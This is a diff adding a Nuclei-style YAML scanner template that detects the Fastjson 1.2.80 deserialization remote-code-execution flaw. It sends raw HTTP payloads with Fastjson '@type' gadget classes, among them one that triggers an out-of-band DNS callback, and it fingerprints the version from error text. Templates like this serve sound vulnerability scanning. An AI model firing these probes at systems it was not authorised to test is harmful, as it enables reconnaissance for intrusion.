@@ -1,0 +1,97 @@
+id: fastjson-1-2-80-deserialization
+
+info:
+  name: Fastjson 1.2.80 and earlier Throwable Deserialization Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Fastjson 1.2.80 and earlier versions use black and white lists to defend against deserialization vulnerabilities. This defense strategy can be bypassed, allowing remote code execution.
+  tags: deserialization, rce
+
+variables:
+  check_str: "{{rand_base(4)}}"
+  check_url: "{{concat('https://', interactsh-url)}}"
+
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"a":{
+        "@type":"java.lang.RuntimeException",
+        "@type":"java.net.Inet4Address","val":"{{check_url}}"}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "autoType is not support"
+
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"b":{"@type":"com.sun.rowset.JdbcRowSetImpl"}}
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "fastjson(-| )version 1\\.[0-2]\\.(\\d|[1-7]\\d|80)(,|;)"
+      - type: word
+        words:
+          - "autoType is not support"
+
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        ["a":"a\\x]
+    matchers:
+      - type: word
+        words:
+          - "fastjson(-| )version"
+
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"b":{"@type":"java.lang.String"}}
+    extractors:
+      - type: regex
+        regex:
+          - "fastjson(-| )version 1\\.[0-2]\\.(\\d|[1-7]\\d|80)(,|;)"
+
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"b":{"@type":"java.lang.RuntimeException"}}
+    matchers:
+      - type: word
+        words:
+          - "autoType is not support"
+
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"a":{
+        "@type":"java.lang.RuntimeException",
+        "@type":"java.net.Inet4Address","val":"{{check_url}}"}}
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
